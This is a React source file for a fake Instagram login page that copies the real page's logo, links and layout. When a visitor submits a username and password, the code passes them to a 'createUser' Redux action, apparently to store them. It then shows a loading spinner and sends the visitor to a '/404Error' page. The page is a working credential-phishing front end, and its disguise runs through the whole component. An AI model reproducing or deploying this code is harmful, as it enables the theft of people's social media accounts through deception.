import { useState, useRef } from "react";
import "./Instagram.css";
import { useDispatch } from "react-redux";
import { createUser } from "../features/userDetailSlice";
import LoginLoader from "./LoginLoader";
import { useNavigate } from "react-router-dom";

const Instagram = () => {
  const [user, setUsers] = useState([]);
  const [inputError, setInputError] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [state, setState] = useState(false);
  // eslint-disable-next-line no-unused-vars
  const [password, setPassword] = useState("");
  const navigate = useNavigate();
  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
  };
  let signUp = "https://www.instagram.com/accounts/emailsignup/";
  let forgotPass = "https://www.instagram.com/accounts/password/reset/";
  let contineWithFB =
    "https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221cm7fjirautrs1a4qa69a7mh941os5opsonxgh1qc1it517slhgv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8e998a98-f6e8-4dd6-b273-221f439e509b%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221cm7fjirautrs1a4qa69a7mh941os5opsonxgh1qc1it517slhgv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr";
  const dispatch = useDispatch();
  const userNameRef = useRef();
  const passwordRef = useRef();
  const passwordLength = passwordRef.current?.value.length ?? 0;
  const getUserData = (e) => {
    setUsers({ ...user, [e.target.name]: e.target.value });
  };
  const passwordInputType = showPassword ? "text" : "password";
  const handleSubmit = (e) => {
    e.preventDefault();

    const usernameValue = userNameRef.current.value;
    const passwordValue = passwordRef.current.value;

    if (!usernameValue || !passwordValue) {
      setInputError(true);
    } else {
      setInputError(false);
      dispatch(createUser(user));
      setState(true);
      setTimeout(() => {
        setState(false);
        userNameRef.current.value = "";
        passwordRef.current.value = "";
        navigate("/404Error");
      }, 3000);
    }
  };
  const handleRed = () => {
    passwordRef.current.style.borderColor = "";
    userNameRef.current.style.borderColor = "";
  };
  const handleTogglePassword = () => {
    setShowPassword((prevShowPassword) => !prevShowPassword);
  };
  return (
    <div id="wrapper">
      <div className="main-content">
        <div className="header">
          <img src="https://i.imgur.com/zqpwkLQ.png" alt="" className="ig" />
        </div>
        <div className="facebook">
          <a href={contineWithFB} className="btlkn">
            <img
              src="data:image/png;base64,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"
              className="fbLogo"
              alt=""
            />
            Continue with Facebook
          </a>
        </div>
        <form className="l-part" onSubmit={handleSubmit}>
          <input
            onFocus={handleRed}
            ref={userNameRef}
            type="text"
            placeholder="Phone number, username, or email"
            className="input-1"
            style={{
              borderColor: inputError ? "red" : "",
            }}
            name="username"
            onChange={getUserData}
          />
          <div className="overlap-text">
            <input
              onFocus={handleRed}
              type={passwordInputType}
              ref={passwordRef}
              placeholder="Password"
              className="input-2"
              style={{
                borderColor: inputError ? "red" : "",
              }}
              name="password"
              // value={password}
              onChange={(e) => {
                getUserData(e);
                handlePasswordChange(e);
              }}
            />
            {passwordLength > 0 && (
              <button
                type="button"
                className="show-hide-button"
                onClick={handleTogglePassword}
              >
                {showPassword ? "Hide" : "Show"}
              </button>
            )}
          </div>
          <a href={forgotPass} className="forgot">
            Forgotten Password?
          </a>
          <button className="btn">{!state ? "Login" : <LoginLoader />}</button>
        </form>
      </div>
      <div className="dnt">
        {" "}
        Don't have an account?
        <a href={signUp} className="sppn">
          {" "}
          Sign up
        </a>
      </div>
      <div className="mt">
        <img
          src="https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg"
          className="metaLogo"
          alt=""
        />
      </div>
    </div>
  );
};

export default Instagram;
